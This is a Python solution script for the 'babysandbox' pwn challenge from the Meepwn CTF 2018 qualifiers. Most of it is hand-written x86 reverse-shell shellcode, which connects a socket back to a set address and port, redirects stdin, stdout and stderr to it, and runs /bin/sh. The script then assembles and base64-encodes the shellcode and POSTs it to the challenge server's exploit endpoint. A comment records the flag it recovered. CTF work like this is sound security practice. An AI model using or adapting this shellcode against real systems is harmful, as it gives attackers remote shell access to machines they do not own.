"""
Meepwn CTF Quals 2018
babysandbox pwn challenge solution
"""
# Imports
import requests
from pwnlib.asm import asm, disasm

SHELLCODE_PAYLOAD = '''
	// Save the address of vdso syscall fuction from the stack to the esi register
	mov esi, esp
	add esi, 0x124
	mov esi, [esi]
	
	// Create a socketfd using sys_socketcall
	mov eax, 0x66

	// SYS_SOCKET			
	mov ebx, 0x1		
	
	// IPPROTO_IP = 0
	xor edx, edx
	push edx

	// SOCK_STREAM = 1		
	push ebx

	// AF_INET = 2		
	push 0x2

	// Socket arguments
	mov ecx, esp

	// socket(AF_INET, SOCK_STREAM, 0);		
	call esi

	// Save socketfd to ebx 
	xchg ebx, eax		

	// sys_dup2 (stderr)
        mov eax, 0x3f
	mov ecx, 2

        // dup2(3, 2)
        call esi
   
        // sys_dup2 (stdout)
        mov eax, 0x3f
	mov ecx, 1

        // dup2(3, 1)
        call esi

 	// sys_dup2 (stdin)
        mov eax, 0x3f
	mov ecx, 0

        // dup2(3, 0)
        call esi

        // Connect to remote server using sys_socketcall
	mov eax, 0x66	
	
	// sa.sin_addr.s_addr (server ip removed)			
	mov edi, 0x0100007f
	push edi

	// sa.sin_port
	mov edi, 0x3905
	push di

	// sa.sin_family = AF_INET 			
	mov edi, 0x02
	push di

	// sa pointer
	mov ecx, esp	

	// sizeof(sa)
	push 16

	// (struct sockaddr *)&sa			
	push ecx

	// socketfd		
	push ebx		

	// Socket arguments
	mov ecx, esp

	// connect(s, (struct sockaddr *)&sa, sizeof(sa));
	call esi

	// sys_execve
        mov eax, 0x0b		

        // Push "/bin//sh\x00\x00\x00\x00" to the stack
        push edx		
        push 0x68732f2f
        push 0x6e69622f		

        // Move address of "/bin//sh" string to ebx
        mov ebx, esp

        // Set ecx to 0	
        xor ecx, ecx

        // Set ecx to 0		
        xor edx, edx	

        // execve("/bin//sh", 0, 0)
	call esi	
''' 

def main():
  """
  Runs on program execution.
  """
  # Assemble and encode reverse shellcode payload 
  payload = str(asm(SHELLCODE_PAYLOAD).encode('base64').replace('\n', ''))

  # Start a requests session
  s = requests.session()

  # Get the home page to set the cookie
  s.get('http://178.128.100.75')

  # Send the payload
  s.post('http://178.128.100.75/exploit', json={"payload": payload})

  # Remote Server:
  #   cat flag
  #   MeePwnCTF{Unicorn_Engine_Is_So_Good_But_Not_Perfect}

# Hook
if __name__ == '__main__':
  main()
